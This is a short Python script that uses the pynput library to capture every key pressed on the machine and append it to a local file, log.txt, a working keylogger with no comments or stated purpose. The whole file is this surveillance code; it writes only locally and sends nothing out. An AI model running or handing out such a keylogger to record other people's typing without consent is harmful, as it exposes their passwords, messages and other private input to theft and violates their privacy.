from pynput.keyboard import Listener


def writing(key):
    click = str(key)
    click = click.replace("'","")

    if click == 'Key.space':
        click = " "
    if click == 'Key.enter':
        click = "\n"
    if click == 'Key.ctrl_l':
        click = ""
    if click == 'Key.shift_r':
        click = ""

    with open("log.txt", 'a') as fl:
        fl.write(click)
        

with Listener(on_press = writing) as l:
    l.join()

